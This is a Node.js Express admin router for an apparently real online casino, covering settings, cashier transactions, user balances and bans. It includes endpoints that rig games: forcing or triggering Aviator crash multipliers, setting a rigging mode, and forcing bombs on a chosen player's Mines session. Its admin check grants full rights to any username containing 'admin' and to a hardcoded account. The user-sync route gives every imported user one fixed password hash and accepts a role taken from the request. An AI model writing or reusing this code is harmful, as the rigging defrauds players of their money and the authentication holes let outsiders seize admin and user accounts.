const express = require('express');
const { authenticateToken } = require('./auth');
const db = require('../db');
const { getActiveMinesSessions, setMinesRigging } = require('./mines');

const router = express.Router();

// Admin-only middleware
function requireAdmin(req, res, next) {
  const cleanName = (req.user?.username || '').toLowerCase();
  const cleanEmail = (req.user?.email || '').toLowerCase();
  const isAdmin = req.user?.role === 'admin' || cleanName === 'saqib_admin' || cleanEmail === '60secscriptdoc@gmail.com' || cleanName.includes('admin');
  if (!isAdmin) {
    return res.status(403).json({ error: 'Access denied: Admin privileges required' });
  }
  next();
}

// Get Dashboard Overview & Metrics
router.get('/stats', authenticateToken, requireAdmin, async (req, res) => {
  if (db.syncWithCloud) await db.syncWithCloud();
  const stats = db.getStats();
  const settings = db.getGameSettings();
  const recentBets = db.getRecentBets(15);
  res.json({ stats, settings, recentBets });
});

// Get Game Settings & House Edge
router.get('/settings', authenticateToken, requireAdmin, (req, res) => {
  res.json({ settings: db.getGameSettings() });
});

// Update RTP / House Edge / Limits
router.put('/settings', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { crashRtp, houseEdge, minBet, maxBet, maxPayout, maintenance } = req.body;
    if (db.syncWithCloud) await db.syncWithCloud();
    const updated = await db.updateGameSettings({
      crashRtp: Number(crashRtp),
      houseEdge: Number(houseEdge),
      minBet: Number(minBet),
      maxBet: Number(maxBet),
      maxPayout: Number(maxPayout),
      maintenance: Boolean(maintenance)
    });
    res.json({ message: 'Settings successfully updated', settings: updated });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// List all cashier transactions (pending, approved, rejected)
router.get('/transactions', authenticateToken, requireAdmin, async (req, res) => {
  if (db.syncWithCloud) await db.syncWithCloud();
  const transactions = db.getTransactions();
  res.json({ transactions });
});

// Approve or Reject Cashier Transaction
router.post('/transactions/:id/action', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { action, notes } = req.body; // action: 'approve' | 'reject'
    if (!['approve', 'reject'].includes(action)) {
      return res.status(400).json({ error: 'Action must be approve or reject' });
    }

    if (db.syncWithCloud) await db.syncWithCloud();
    const tx = await db.processTransaction(req.params.id, action, notes);
    res.json({ message: `Transaction has been ${action}d successfully`, transaction: tx });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// List all registered users
router.get('/users', authenticateToken, requireAdmin, async (req, res) => {
  if (db.syncWithCloud) await db.syncWithCloud();
  const currentDb = db.readDB();
  const safeUsers = currentDb.users.map(u => ({
    id: u.id,
    username: u.username,
    email: u.email,
    role: u.role,
    balance: u.balance,
    bonusBalance: u.bonusBalance,
    createdAt: u.createdAt,
    isBanned: u.isBanned
  }));
  res.json({ users: safeUsers });
});

// Sync local users to server database
router.post('/sync-users', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { users } = req.body;
    if (db.syncWithCloud) await db.syncWithCloud();
    if (Array.isArray(users)) {
      const currentDb = db.readDB();
      let added = 0;
      users.forEach(u => {
        const usernameClean = (u.username || '').toLowerCase();
        const emailClean = (u.email || '').toLowerCase();
        const exists = currentDb.users.some(existing => 
          existing.id === u.id || 
          (emailClean && existing.email && existing.email.toLowerCase() === emailClean) || 
          (usernameClean && existing.username && existing.username.toLowerCase() === usernameClean)
        );
        if (!exists && (usernameClean || emailClean)) {
          currentDb.users.push({
            id: u.id || `usr_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`,
            username: u.username,
            email: u.email || '',
            passwordHash: '$2b$10$Whzk8jMkMaVStBl1AONWpOuftjz2u.8BS1RKXrErlLP5aWtUZXFu2',
            role: u.role || 'user',
            balance: Number(u.balance || 0),
            bonusBalance: Number(u.bonusBalance || 0),
            createdAt: u.createdAt || new Date().toISOString(),
            isBanned: !!u.isBanned
          });
          added++;
        }
      });
      if (added > 0) {
        await db.writeDB(currentDb);
      }
    }
    const currentDb = db.readDB();
    const safeUsers = currentDb.users.map(u => ({
      id: u.id,
      username: u.username,
      email: u.email,
      role: u.role,
      balance: u.balance,
      bonusBalance: u.bonusBalance,
      createdAt: u.createdAt,
      isBanned: u.isBanned
    }));
    res.json({ message: 'Users synced successfully', users: safeUsers });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Manual Balance Adjustment or Ban user
router.post('/users/:id/action', authenticateToken, requireAdmin, async (req, res) => {
  try {
    const { action, amount, isBanned } = req.body;
    if (db.syncWithCloud) await db.syncWithCloud();
    const currentDb = db.readDB();
    const user = currentDb.users.find(u => u.id === req.params.id);
    if (!user) return res.status(404).json({ error: 'User not found' });

    if (action === 'adjust_balance' && typeof amount === 'number') {
      await db.updateUserBalance(user.id, amount);
    }

    if (typeof isBanned === 'boolean') {
      user.isBanned = isBanned;
      await db.writeDB(currentDb);
    }

    res.json({ message: 'User updated successfully', user });
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// Reset All Platform Data & Stats to 0 (Fresh Start)
router.post('/reset-stats', authenticateToken, requireAdmin, async (req, res) => {
  try {
    if (db.syncWithCloud) await db.syncWithCloud();
    const result = await db.resetPlatformData();
    res.json({ message: 'Platform data and stats successfully reset to 0 (Fresh Start)', ...result });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ==================== LIVE GAME CONTROLS & RIGGING ====================

// 1. Aviator Real-Time Game Control
router.get('/game-control/aviator', authenticateToken, requireAdmin, (req, res) => {
  const crashEngine = req.app.get('crashEngine');
  if (!crashEngine) {
    return res.status(500).json({ error: 'Crash engine not initialized' });
  }
  res.json(crashEngine.getAdminStatus());
});

router.post('/game-control/aviator/crash-now', authenticateToken, requireAdmin, (req, res) => {
  const crashEngine = req.app.get('crashEngine');
  if (!crashEngine) {
    return res.status(500).json({ error: 'Crash engine not initialized' });
  }
  const result = crashEngine.manualCrashNow();
  res.json(result);
});

router.post('/game-control/aviator/set-multiplier', authenticateToken, requireAdmin, (req, res) => {
  const { multiplier } = req.body;
  const num = parseFloat(multiplier);
  if (isNaN(num) || num < 1.01) {
    return res.status(400).json({ error: 'Valid multiplier >= 1.01 required' });
  }
  const crashEngine = req.app.get('crashEngine');
  if (!crashEngine) {
    return res.status(500).json({ error: 'Crash engine not initialized' });
  }
  const result = crashEngine.setForcedNextMultiplier(num);
  res.json(result);
});

router.post('/game-control/aviator/mode', authenticateToken, requireAdmin, (req, res) => {
  const { mode } = req.body;
  const crashEngine = req.app.get('crashEngine');
  if (!crashEngine) {
    return res.status(500).json({ error: 'Crash engine not initialized' });
  }
  try {
    const result = crashEngine.setRiggingMode(mode);
    res.json(result);
  } catch (err) {
    res.status(400).json({ error: err.message });
  }
});

// 2. Mines Real-Time Game Control & Rigging
router.get('/game-control/mines', authenticateToken, requireAdmin, (req, res) => {
  res.json(getActiveMinesSessions());
});

router.post('/game-control/mines/rig', authenticateToken, requireAdmin, (req, res) => {
  const { mode, userId, forceBomb } = req.body;
  const result = setMinesRigging(mode, userId, forceBomb);
  res.json(result);
});

module.exports = router;
